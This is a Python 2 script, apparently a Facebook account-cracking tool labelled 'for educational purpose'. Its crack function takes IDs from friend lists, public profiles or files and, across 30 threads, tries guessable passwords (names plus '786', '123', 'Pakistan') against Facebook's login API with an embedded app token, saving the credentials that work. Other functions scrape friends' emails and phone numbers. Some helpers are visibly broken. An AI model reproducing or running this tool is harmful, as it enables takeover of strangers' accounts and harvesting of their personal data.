#!/usr/bin/python
# coding=utf-8
# Written By Tech Qaiser If You want to Get Creadit Of My Project Then See Your self again
# Source : Python2"
# Ranked : Silver lll.

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Kgf.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
	print "[!]\033[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def hopss(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
banner = """
\033[1;92m╭━━━╮
\033[1;92m┃╭━╮┃
\033[1;92m┃┃╱┃┣━━┳┳━━┳━━┳━╮
\033[1;92m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
\033[1;92m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
\033[1;92m╰━━╮┣╯╰┻┻━━┻━━┻╯
\033[1;92m╱╱╱╰╯

\033[1;97m-----------------------------------------------

\033[1;91m╘\033[1;93mCoder   :\033[1;95mTech Qaiser
\033[1;91m╘\033[1;93mGithub  :\033[1;95mhttps://github.com/TechQaiser
\033[1;91m╘\033[1;93mFacebook:\033[1;95mQaiser Abbas
\033[1;91m╘\033[1;93mYoutube :\033[1;95mTech Qaiser
\033[1;91m╘\033[1;93mNote :\033[1;95mThis Is only For Educational Purpose
\033[1;91m╘\033[1;93mNew Update :\033[1;95m Identity Problem Fixed 100% If You Login With Acces Token

\033[1;97m-----------------------------------------------"""
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔]\033[1;91mLogging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []
			
#Menu
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!]\033[1;91m Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] \033[1;91mYour Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	except requests.exceptions.ConnectionError:
		print"[!] \033[1;91mOaps No Connection"
		time.sleep(1)
		('python2 Kgf.py')
	os.system("clear")
	print banner
	print "\033[1;94mName: "+name
	print " \033[1;94mID  : "+id
	print (47*"-")
	print "\033[1;91m[1]\033[1;93m Start Cloning."
	print "\033[1;91m[2]\033[1;93m Clone With Your  Choice Password."
	print "\033[1;91m[3]\033[1;93mGrabbing ids Tools."
	print "\033[1;91m[4] \033[1;93mAuto Delete Tools."
	print "\033[1;91m[5]\033[1;93m Update This Command."
	print "\033[1;91m[6]\033[1;93mSubscribe My Youtube Channel."
	print "\033[1;91m[7]\033[1;93mLogout"
	print ('                  ')
	men()

def men():
	rana = raw_input("\033[1;96mChoose Option -->  ")
	if rana =="":
		print " \033[1;91mWrong Input"
		men()
	elif rana =="1":
		crack()
	elif rana =="2":
	    os.system('clear')
	    hamza('[!]\033[1;91m Please Wait While ')
	    hopss('\033[1;96m10%..Loading.')
	    hopss('\033[1;96m20%.Loading..')
	    hopss('\033[1;96m50%.Loading..')
	    hopss('\033[1;96m70%..Loading.')
	    hopss('\033[1;96m90%..Loading.')
	    hopss('\033[1;95m95%..Done.')
	    os.system('python2 .Choose.py')
	    time.sleep(1)
	elif rana =="3":
		grab()
	elif rana =="4":
		bot()
	elif rana =="5":
		os.system('clear')
		print banner
		hamza('[✓] \033[1;94mPlease Wait While Tool Is Updating .....')
		os.system('git pull origin master')
		hamza('[✓] \033[1;94m Done Tool Has Been Updated ')
		hamza('[✓]\033[1;94m Please Wait While Bcoz Setting Is Updating In Your Andriod')
		time.sleep(3)
		os.hamza('python2 Kgf.py')
	elif rana =="6":
		os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
		hamza('[✓] Logged Out Successfully')
		os.system('python2 Kgf.py')
	else:
		print "[!] \033[1;91mWrong Input"
		men()
	
##### INFO #####
def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	print "\033[1;92m[1] \033[1;94mClone From Friendlist."
	print "\033[1;92m[2]\033[1;94m Clone From Any Public ID."
	print "\033[1;92m[3] \033[1;94mClone From File."
	print "\033[1;92m[0] \033[1;97mBack."
	crack_menu()

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print banner
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print banner
		idt = raw_input("[☕] \033[1;96mInput ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza('\033[1;95mAccount Name \033[1;93m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] \033[1;91mID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    print banner
	    try:
	        idlist= raw_input('\033[1;96m File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] \033[1;91mFile Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        hamza(' \033[1;95mTotal Friends: '+str(len(id)))
        time.sleep(0.5)
	hamza('\033[1;95m The Process Has Been Started.')
	time.sleep(0.5)
        hamza('\033[1;91mTo Stop Process Press CTRL Then Press Z')
        time.sleep(0.5)
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			pass1='786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '786'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;94m[\x1b[1;97mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(user+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(user+pass6)
														else:
															pass7 = b['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print '\x1b[1;97m[\x1b[1;94mCheckpoint-OpenAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(user+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(user+pass7)           					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m----------------------------------------------"
	hamza('[Done].\033[1;93mProcess Has Been Completed.')
	hamza('[Cp] \033[1;93mCheckpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print (" Total \033[1;94mOK/\033[1;94mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\n\033[1;92mPress Enter To Back ")
	menu()	
	

        
##### Grab #####
def grab():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] \033[1;91mToken Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	print "[1] \033[1;95mExtract Numeric IDs From Public ID."
	print "[2] \033[1;95mExtract Emails From Public ID."
	print "[3]\033[1;95m Extract Phone Number From Public ID."
	print "[0]\033[1;95m Back."
	print('          ')
	grab_menu()
	
#Grab_input
def grab_menu():
	grm = raw_input("\n\033[1;96mChoose Option >> ")
	if grm =="":
		print " \033[1;91mWrong Input"
		grab_menu()
	elif grm =="1":
		idfromfriend()
	elif grm =="2":
		emailfromfriend()
	elif grm =="3":
		numberfromfriend()
	elif grm =="0":
		menu()
	else:
		print "[!] Wrong input"
		grab_menu()
		


##### Extract IDs From Public Id #####
def idfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		('python2 Kgf.py')
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Account Name : "+op["name"]
		except KeyError:
			print"[!]\033[1;91m Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		hamza('\033[1;93mGetting Friends Numeric IDs.Wait A while..')
		print"--------------------------------------"
		bz = open('save/id.txt','w')
		for a in z['friends']['data']:
			idh.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\033[1;93mThe Process Has Been Completed.'
		print"\033[1;93mTotal IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\033[1;93mThe File Has Been Saved As save/"+done)
		raw_input("\n\033[1;94mPress Enter To Back ")
		grab()
	except IOError:
		print"[!] \033[1;91mError While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91mThe Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] \033[1;91mError')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] \033[1;91mNo Connection"
		time.sleep(1)
		grab()

##### EMAIL FROM Friend#####
def emailfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] \033[1;91mToken Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("\033[1;95m  ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;94mAccount Name : "+op["name"]
		except KeyError:
			print"[!] \033[1;91mAccount Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('\033[1;94mGetting Emails From')
		print 40*"\033[1;97m-"
		bz = open('save/email.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromfriend.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromfriend))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "----------------------------------"
		print '\033[1;93m Successfully Extracted Mails'
		print" \033[1;93mTotal Mail Founded : "+str(len(emfromfriend))
		done = raw_input("033[1;93m[✓] \033[1;93mSave File With Name\033[1;97m :\033[1;97m ")
		print(" \033[1;93mFile Has Been Saved As : save/"+done)
		raw_input("\nPress Enter  To Back ")
		grab()
	except IOError:
		print"[!] \033[1;91mError While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!] \033[1;91mProcess Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] \033[1;91mError')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"\033[1;91mNo Connection"
		time.sleep(1)
		grab()
		


##### Number From Public Id #####
def numberfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] \033[1;91mToken Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;95mAccount Name : "+op["name"]
		except KeyError:
			print"[!] \033[1;91mFriend Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('\033[1;94mGetting All Numbers')
		print 40*"\033[1;97m-"
		bz = open('save/number.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nofromfriend.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;92m[ \033[1;92m"+str(len(nofromfriend))+"\033[1;97m ]\033[1;97m \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.001)
			except KeyError:
				pass
		bz.close()
		print "-----------------------------------"
		print"\033[1;93mTotal Number Founded : "+str(len(nofromfriend))
		done = raw_input(" \033[1;93mSave File With Name: ")
		print(" \033[1;93mFile Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] \033[1;91mError While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91mThe Process Has Been Stopped")
		raw_input("\nPress Enter To Back")
		grab()
	except KeyError:
		print('\033[1;91m Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print" \033[1;91mNo Connection"
		time.sleep(1)
		grab()

##### MENU BOT #####
#----------------------------------------#
def bot():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!]\033[1;91m Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	print "[1] \033[1;95mAuto Delete Posts."
	print "[2] \033[1;95mAuto Accept Friend Requests."
	print "[3] \033[1;95mAuto Unfriend All Friends "
	print "[0] Back."
	print ('         ')
	bot_menu()
	
def bot_menu():
	bots = raw_input("\nChoose Option >> ")
	if bots =="":
		print "[!] \033[1;91mWrong Input"
		bot_menu()
	elif bots =="1":
		deletepost()
	elif bots =="2":
		accept()
	elif bots =="3":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "[!] \033[1;91mWrong Input"
		bot_menu()
		


##### Auto Delt Post #####
def deletepost():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		name = lol['name']
	except IOError:
		print"[!]\033[1;91m Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	print("\033[1;93mAccount Name : "+nama)
	hamza("\033[1;93mThe Process Has Been Started")
	print (40*"-")
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m] \033[1;97m[!] Failed'
		except TypeError:
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m \033[1;97[✓] [Deleted]'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91mConnection Error"
			raw_input("\nPress Enter To Back ")
			bot()
	print (40*"-")
	print"\033[1;91mThe Process Has Been Completed. "
	raw_input("\nPress Enter To Back ")
	bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	limit = raw_input("\033[1;95mEnter Limit To Accept Requests : ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"\033[1;91mNo friend Request"
		raw_input("\033[1;91mPress Enter To Back ")
		bot()
	hamza('\033[1;91mThe Process Has Been Start')
	print (40*"-")
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;91m [Failed] | "+i['from']['name']
		else:
			print "\033[1;95m[Accepted] |  "+i['from']['name']
	print (40*"-")
	print"\033[1;91mThe Process Has Been Completed."
	raw_input("\nPress Enter To Back ")
	bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 Kgf.py')
	os.system('clear')
	print banner
	hamza('\033[1;91mThe Process Has Been Started.')
	print "\033[1;91mPress CTRL Z to Stop Process."
	print (50*"-")
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			name = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;95m [Unfriended] | "+name
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91mThe Process Has Been Stopped"
		raw_input("\n Press Enter To Back ")
		bot()
	print"\033[1;91mThe Process Has Been Completed."
	raw_input("Press Enter To Back ")
	bot()
	
if __name__ == '__main__':
	menu()


